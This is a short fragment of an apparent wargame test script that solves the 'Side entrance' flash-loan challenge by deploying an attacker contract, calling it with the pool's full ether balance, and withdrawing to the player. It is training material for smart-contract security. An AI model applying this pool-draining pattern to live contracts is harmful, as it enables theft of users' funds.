...
describe('[Challenge] Side entrance', function () {
    ...
    it('Execution', async function () {
        ...
        side = await(await ethers.getContractFactory('side',player)).deploy(pool.address);
        console.log("sideaddress=",side.address);
        await side.connect(player).onflash(ETHER_IN_POOL)
        await side.connect(player).withdraw(player.address);
